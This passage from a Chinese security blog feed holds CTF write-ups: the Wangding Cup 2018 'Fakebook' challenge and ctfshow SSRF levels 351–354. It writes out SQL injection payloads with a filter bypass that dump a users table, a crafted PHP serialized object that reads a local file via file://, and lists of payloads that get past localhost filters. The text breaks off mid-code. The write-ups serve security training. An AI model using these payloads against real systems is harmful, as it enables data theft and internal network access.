        <content type="html"><![CDATA[<h1 id="网鼎杯2018Fakebook1"><a href="#网鼎杯2018Fakebook1" class="headerlink" title="网鼎杯2018Fakebook1"></a>网鼎杯2018Fakebook1</h1><p>1、首先启动靶机并访问，发现是一个博客的登录注册页面</p><p><img src="/../image/%E7%BD%91%E9%BC%8E%E6%9D%AF2018Fakebook1-1.png"></p><p>2、首先现在登录界面试试万能密码<code>admin&#39; or 1=1#</code>，发现有弹窗login failed，然后查看源码发现这里使用js代码对账号密码进行验证，应该不存在sql注入</p><p><img src="/../image/%E7%BD%91%E9%BC%8E%E6%9D%AF2018Fakebook1-2.png"></p><p><img src="/../image/%E7%BD%91%E9%BC%8E%E6%9D%AF2018Fakebook1-3.png"></p><p>3、既然没有漏洞我们先访问下url&#x2F;robots.txt看看有没有有用的信息，看到一个&#x2F;user.php.bak</p><p><img src="/../image/%E7%BD%91%E9%BC%8E%E6%9D%AF2018Fakebook1-4.png"></p><p>4、访问url&#x2F;user.php.bak将其下载下来，然后再phpstorm里进行代码审计</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UserInfo</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span> = <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$age</span> = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$blog</span> = <span class="hljs-string">&quot;&quot;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$age</span>, <span class="hljs-variable">$blog</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;name = <span class="hljs-variable">$name</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;age = (<span class="hljs-keyword">int</span>)<span class="hljs-variable">$age</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;blog = <span class="hljs-variable">$blog</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get</span>(<span class="hljs-params"><span class="hljs-variable">$url</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$ch</span> = <span class="hljs-title function_ invoke__">curl_init</span>();<br><br>        <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_URL, <span class="hljs-variable">$url</span>);<br>        <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);<br>        <span class="hljs-variable">$output</span> = <span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);<br>        <span class="hljs-variable">$httpCode</span> = <span class="hljs-title function_ invoke__">curl_getinfo</span>(<span class="hljs-variable">$ch</span>, CURLINFO_HTTP_CODE);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$httpCode</span> == <span class="hljs-number">404</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">404</span>;<br>        &#125;<br>        <span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>);<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$output</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getBlogContents</span> (<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-variable">$this</span>-&gt;blog);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">isValidBlog</span> (<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$blog</span> = <span class="hljs-variable language_">$this</span>-&gt;blog;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;</span>, <span class="hljs-variable">$blog</span>);<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>看到curl_exec就能猜到这里是ssrf，并且还有回显echo $output，然后一个正则匹配去过滤blog的地址，这里应该都跟注册有关系。</p><p>5、去注册界面随便注册一个账号，blog这里我们用<a href="http://www.baidu.com/">www.baidu.com</a></p><p><img src="/../image/%E7%BD%91%E9%BC%8E%E6%9D%AF2018Fakebook1-5.png"></p><p>6、然后登录进去，发现这里会回显出所有的用户名信息、用户年龄、博客地址，并且还有iframe标签去包含博客页面。</p><p><img src="/../image/%E7%BD%91%E9%BC%8E%E6%9D%AF2018Fakebook1-6.png"></p><p>并且这里将百度的html页面全都用data:&#x2F;&#x2F;伪协议进行了base64编码，然后包含</p><p><img src="/../image/%E7%BD%91%E9%BC%8E%E6%9D%AF2018Fakebook1-7.png"></p><p>7、看到url中有个get传参view.php?no&#x3D;1，猜测这里的用户数据应该是从数据库查询出来回显的，所以我们测试一下</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs armasm">?no<span class="hljs-number">=1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-number">=2</span><span class="hljs-comment">//发现报错</span><br>?no<span class="hljs-number">=1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-number">=1</span><span class="hljs-comment">//正常回显</span><br></code></pre></td></tr></table></figure><p>说明这里存在sql注入，并且是数字型</p><p>8、然后就能进行sql注入固定流程了。</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">?<span class="hljs-keyword">no</span>=<span class="hljs-number">1</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">4</span>//判断列数为<span class="hljs-number">4</span>列<br><br>?<span class="hljs-keyword">no</span>=<span class="hljs-number">0</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>//显示<span class="hljs-keyword">no</span> hack~_~，说明存在过滤<br>测试发现只有<span class="hljs-keyword">union</span>和<span class="hljs-keyword">select</span>一起出现才会被过滤匹配，所以这里可以使用注释符<span class="hljs-comment">/**/</span>绕过<br><br>?<span class="hljs-keyword">no</span>=<span class="hljs-number">0</span> <span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>//测得回显位为<span class="hljs-number">2</span><br><br>?<span class="hljs-keyword">no</span>=<span class="hljs-number">0</span> <span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-keyword">database</span>(),<span class="hljs-number">3</span>,<span class="hljs-number">4</span>//爆出库名fakebook<br><br>?<span class="hljs-keyword">no</span>=<span class="hljs-number">0</span> <span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">table_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;fakebook&#x27;</span>),<span class="hljs-number">3</span>,<span class="hljs-number">4</span>//爆出表名users<br><br>?<span class="hljs-keyword">no</span>=<span class="hljs-number">0</span> <span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">column_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span>),<span class="hljs-number">3</span>,<span class="hljs-number">4</span>//爆出列名<span class="hljs-keyword">no</span>,username,passwd,data,<span class="hljs-keyword">USER</span>,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS<br><br>?<span class="hljs-keyword">no</span>=<span class="hljs-number">0</span> <span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span> group_concat(<span class="hljs-keyword">no</span>,<span class="hljs-string">&#x27;-&#x27;</span>,username,<span class="hljs-string">&#x27;-&#x27;</span>,passwd,<span class="hljs-string">&#x27;-&#x27;</span>,data) <span class="hljs-keyword">from</span> users),<span class="hljs-number">3</span>,<span class="hljs-number">4</span>//查出数据<br></code></pre></td></tr></table></figure><p>9、经过sql注入查出数据，当前页面回显</p><p><img src="/../image/%E7%BD%91%E9%BC%8E%E6%9D%AF2018Fakebook1-8.png"></p><p>发现这里有个序列化字符串</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">O</span>:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;UserInfo&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;admin&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;age&quot;</span>;i:<span class="hljs-number">14</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;blog&quot;</span>;s:<span class="hljs-number">13</span>:<span class="hljs-string">&quot;www.baodu.com&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>然后上面有一行报错很容易注意到</p><p><img src="/../image/%E7%BD%91%E9%BC%8E%E6%9D%AF2018Fakebook1-9.png"></p><p>大概意思是一个字节，反序列化错误，然后我们将sql语句中的4改为44，就会显示两个字节，并且下面的iframe标签处也有报错。</p><p><code>**Fatal error**: Call to a member function getBlogContents() on boolean in **/var/www/html/view.php** on line **67**</code></p><p>说明这里blog地址，age等数据是通过php反序列化得到并回显到页面上，并且回显位即数据位就是4所在的位置，所以我们可以构造反序列化字符串。通过file伪协议去读取&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php路径下的flag.php，然后iframe标签就会去读取文件并且base64编码</p><p>10、构造payload：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">O</span>:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;UserInfo&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;admin&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;age&quot;</span>;i:<span class="hljs-number">14</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;blog&quot;</span>;s:<span class="hljs-number">29</span>:<span class="hljs-string">&quot;file:///var/www/html/flag.php&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>这时sql语句就变成了</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp">?no=<span class="hljs-number">0</span> union<span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,(<span class="hljs-function"><span class="hljs-keyword">select</span> <span class="hljs-title">group_concat</span>(<span class="hljs-params">no,<span class="hljs-string">&#x27;-&#x27;</span>,username,<span class="hljs-string">&#x27;-&#x27;</span>,passwd,<span class="hljs-string">&#x27;-&#x27;</span>,data</span>) <span class="hljs-keyword">from</span> users),3,&#x27;O:8:&quot;UserInfo&quot;:3:</span>&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;admin&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;age&quot;</span>;i:<span class="hljs-number">14</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;blog&quot;</span>;s:<span class="hljs-number">29</span>:<span class="hljs-string">&quot;file:///var/www/html/flag.php&quot;</span>;&#125;<span class="hljs-string">&#x27;</span><br></code></pre></td></tr></table></figure><p>11、得到flag</p><p>然后查看源码即可发现在iframe标签内的base64编码，这是因为flag.php中的代码被包含并且进行了base64编码。解码之后即是flag</p><p><img src="/../image/%E7%BD%91%E9%BC%8E%E6%9D%AF2018Fakebook1-10.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php">PD9waHANCg0KJGZsYWcgPSAiZmxhZ3s3ZTdjNTk4Zi0zMWVjLTQ1ZTQtOWQzZS03ZTg5MDg1ZmE2OTZ9IjsNCmV4aXQoMCk7DQo=<br><br><span class="hljs-comment">#base64解码</span><br><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$flag</span> = <span class="hljs-string">&quot;flag&#123;7e7c598f-31ec-45e4-9d3e-7e89085fa696&#125;&quot;</span>;<br><span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);<br></code></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 刷题笔记 </tag>
            
            <tag> php反序列化 </tag>
            
            <tag> sql注入 </tag>
            
            <tag> ssrf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow-ssrf</title>
      <link href="/2025/03/19/ctfshow-ssrf/"/>
      <url>/2025/03/19/ctfshow-ssrf/</url>
      
        <content type="html"><![CDATA[<h1 id="ctfshow-SSRF"><a href="#ctfshow-SSRF" class="headerlink" title="ctfshow-SSRF"></a>ctfshow-SSRF</h1><h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><p>服务端请求伪造（Server Side Request Forgery, SSRF）指的是攻击者在未能取得服务器所有权限时，利用服务器漏洞以服务器的身份发送一条构造好的请求给服务器所在内网。SSRF攻击通常针对外部网络无法直接访问的内部系统。</p><p>危害<br>SSRF可以对外网、服务器所在内网、本地进行端口扫描，攻击运行在内网或本地的应用，或者利用File协议读取本地文件。</p><p>内网服务防御相对外网服务来说一般会较弱，甚至部分内网服务为了运维方便并没有对内网的访问设置权限验证，所以存在SSRF时，通常会造成较大的危害。</p><h2 id="web-351（无过滤）"><a href="#web-351（无过滤）" class="headerlink" title="web-351（无过滤）"></a>web-351（无过滤）</h2><p>首先看题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$url</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br><span class="hljs-comment">//初始化一个cURL会话</span><br><span class="hljs-variable">$ch</span>=<span class="hljs-title function_ invoke__">curl_init</span>(<span class="hljs-variable">$url</span>);<br><span class="hljs-comment">//设定返回信息中包含响应信息头</span><br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);<br><span class="hljs-comment">//启用时会将头文件的信息作为数据流输出。 </span><br><span class="hljs-comment">//参数为1表示输出信息头,为0表示不输出</span><br> <br><span class="hljs-comment">//设定curl_exec()函数将响应结果返回，而不是直接输出</span><br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);<br><span class="hljs-comment">//参数为1表示$result,为0表示echo $result</span><br> <br><span class="hljs-comment">//执行一个cURL会话</span><br><span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);<br><span class="hljs-comment">//关闭一个curl会话</span><br><span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>);<br><span class="hljs-comment">//输出返回信息  如果CURLOPT_RETURNTRANSFER参数为fasle可省略</span><br><span class="hljs-keyword">echo</span> (<span class="hljs-variable">$result</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>分析源码发现没有过滤，直接使用file协议读取本地文件。</p><p>尝试post传入url，并使用file协议作为参数，file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd 有返回值。 然后猜测flag在当前目录，而当前目录一般都是&#x2F;var&#x2F;www&#x2F;html </p><p>payload：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">post：<br>url=http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>/flag.php<br>url=localhost/flag.php<br>url=file:<span class="hljs-regexp">//</span><span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/</span>flag.php<span class="hljs-regexp">//</span>需要查看源码<br></code></pre></td></tr></table></figure><hr><h2 id="web-352（过滤localhost和127-0-0绕过）"><a href="#web-352（过滤localhost和127-0-0绕过）" class="headerlink" title="web-352（过滤localhost和127.0.0绕过）"></a>web-352（过滤localhost和127.0.0绕过）</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$url</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br><span class="hljs-variable">$x</span>=<span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$url</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$x</span>[<span class="hljs-string">&#x27;scheme&#x27;</span>]===<span class="hljs-string">&#x27;http&#x27;</span>||<span class="hljs-variable">$x</span>[<span class="hljs-string">&#x27;scheme&#x27;</span>]===<span class="hljs-string">&#x27;https&#x27;</span>)&#123;<br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/localhost|127.0.0/&#x27;</span>))&#123;<span class="hljs-comment">//过滤掉了localhost和127.0.0</span><br><span class="hljs-variable">$ch</span>=<span class="hljs-title function_ invoke__">curl_init</span>(<span class="hljs-variable">$url</span>);<br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);<br><span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);<br><span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>);<br><span class="hljs-keyword">echo</span> (<span class="hljs-variable">$result</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker&#x27;</span>);<br>&#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker&#x27;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span> hacker<br></code></pre></td></tr></table></figure><p>发现过滤了localhost和127.0.0</p><p>可以使用很多方法绕过</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">url</span>=http://<span class="hljs-number">0</span>x7F.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>/flag.php   <span class="hljs-number">16</span>进制<br><span class="hljs-attribute">url</span>=http://<span class="hljs-number">0177</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>/flag.php    <span class="hljs-number">8</span>进制<br><span class="hljs-attribute">url</span>=http://<span class="hljs-number">0.0.0.0</span>/flag.php<br><span class="hljs-attribute">url</span>=http://<span class="hljs-number">0</span>/flag.php在Linux中<span class="hljs-number">0</span>表示自身的地址<br><span class="hljs-attribute">url</span>=http://<span class="hljs-number">127.127.127.127</span>/flag.php<br><span class="hljs-attribute">url</span>=http://<span class="hljs-number">7</span>f000001.c0a80001.rbndr.us/flag.phpDNS重绑定<br></code></pre></td></tr></table></figure><hr><h2 id="web-353（过滤127-0-01和localhost绕过）"><a href="#web-353（过滤127-0-01和localhost绕过）" class="headerlink" title="web-353（过滤127.0.01和localhost绕过）"></a>web-353（过滤127.0.01和localhost绕过）</h2><p>先看看题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$url</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br><span class="hljs-variable">$x</span>=<span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$url</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$x</span>[<span class="hljs-string">&#x27;scheme&#x27;</span>]===<span class="hljs-string">&#x27;http&#x27;</span>||<span class="hljs-variable">$x</span>[<span class="hljs-string">&#x27;scheme&#x27;</span>]===<span class="hljs-string">&#x27;https&#x27;</span>)&#123;<br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/localhost|127\.0\.|\。/i&#x27;</span>, <span class="hljs-variable">$url</span>))&#123;<br><span class="hljs-variable">$ch</span>=<span class="hljs-title function_ invoke__">curl_init</span>(<span class="hljs-variable">$url</span>);<br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);<br><span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);<br><span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>);<br><span class="hljs-keyword">echo</span> (<span class="hljs-variable">$result</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker&#x27;</span>);<br>&#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker&#x27;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span> hacker<br></code></pre></td></tr></table></figure><p>过滤更加严格，但可以使用进制变换，和上一题类似</p><figure class="highlight qml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs qml">十六进制<br><span class="hljs-built_in">url</span>=<span class="hljs-attribute">http</span>:<span class="hljs-comment">//0x7F.0.0.1/flag.php</span><br><br>八进制<br><span class="hljs-built_in">url</span>=<span class="hljs-attribute">http</span>:<span class="hljs-comment">//0177.0.0.1/flag.php</span><br><br><span class="hljs-number">10</span> 进制整数格式<br><span class="hljs-built_in">url</span>=<span class="hljs-attribute">http</span>:<span class="hljs-comment">//2130706433/flag.php</span><br><br><span class="hljs-number">16</span> 进制整数格式，还是上面那个网站转换记得前缀<span class="hljs-number">0</span>x<br><span class="hljs-built_in">url</span>=<span class="hljs-attribute">http</span>:<span class="hljs-comment">//0x7F000001/flag.php</span><br><br><span class="hljs-comment">// 缺省零</span><br><span class="hljs-built_in">url</span>=<span class="hljs-attribute">http</span>:<span class="hljs-comment">//127.1/flag.php</span><br>用CIDR绕过localhost<br><span class="hljs-built_in">url</span>=<span class="hljs-attribute">http</span>:<span class="hljs-comment">//127.127.127.127/flag.php</span><br><span class="hljs-comment">//在Linux中0表示自身的地址，所以可以绕过，在windows中解析成 0.0.0.0所以在windows中不行</span><br><span class="hljs-built_in">url</span>=<span class="hljs-attribute">http</span>:<span class="hljs-comment">//0/flag.php</span><br><span class="hljs-built_in">url</span>=<span class="hljs-attribute">http</span>:<span class="hljs-comment">//0.0.0.0/flag.php</span><br><br><span class="hljs-comment">//使用sudo.cc代替127.0.0.1/localhost </span><br><span class="hljs-built_in">url</span>=<span class="hljs-attribute">http</span>:<span class="hljs-comment">//sudo.cc/flag.php</span><br><br><span class="hljs-comment">// 127.0.0.1 ~ 127.255.255.254 都表示 localhost</span><br><span class="hljs-built_in">url</span>=<span class="hljs-attribute">http</span>:<span class="hljs-comment">//127.255.255.254/flag.php</span><br></code></pre></td></tr></table></figure><hr><h2 id="web-354（过滤了0和1、localhost、DNS重绑定、302跳转）"><a href="#web-354（过滤了0和1、localhost、DNS重绑定、302跳转）" class="headerlink" title="web-354（过滤了0和1、localhost、DNS重绑定、302跳转）"></a>web-354（过滤了0和1、localhost、DNS重绑定、302跳转）</h2><p>先看题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 